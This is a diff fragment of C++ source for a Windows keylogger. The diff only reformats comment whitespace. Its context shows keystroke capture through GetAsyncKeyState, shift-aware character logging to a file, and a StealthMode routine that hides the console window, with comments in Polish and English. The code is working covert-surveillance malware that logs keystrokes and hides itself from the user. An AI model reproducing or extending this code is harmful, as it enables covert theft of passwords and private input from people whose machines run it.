@@ -27,14 +27,14 @@ void StartLogging() {
                     switch (c) {
                         case 48:
                             if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - sprawdza czy SHIFT jest wciśnięty
-                                file << ")";                            				//zamiast if(GetAsyncKeyState(0x10))...else... można zrobić
-                            else                                        				//ogólny przypadek case VK_SHIFT (ale wtedy tekst jest mniej
-                                file << "0";                            				//czytelny)
+                                file << ")";                            //zamiast if(GetAsyncKeyState(0x10))...else... można zrobić
+                            else                                        //ogólny przypadek case VK_SHIFT (ale wtedy tekst jest mniej
+                                file << "0";                            //czytelny)
                             break;
                         case 49:
                             if(GetAsyncKeyState(0x10))                  //GetAsyncKeyState(0x10) - checks if the shift key is pressed
-                                file << "!";                            				//instead of if(GetAsyncKeyState(0x10))...else... you can do
-                            else                                        				//a general case VK_SHIFT (but the text becomes less readable)
+                                file << "!";                            //instead of if(GetAsyncKeyState(0x10))...else... you can do
+                            else                                        //a general case VK_SHIFT (but the text becomes less readable)
                                 file << "1";
                             break;
                         case 50:
@@ -110,7 +110,7 @@ void StartLogging() {
 }
 
 void StealthMode(){                                            	 				//STEALTHMODE - tworzy uchwyt okna i go ukrywa
-    HWND stealth;                                               					//   -||-     - creates a handle to a window and hides it
+    HWND stealth;                                               				//   -||-     - creates a handle to a window and hides it
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", nullptr);
     ShowWindow(stealth,0);
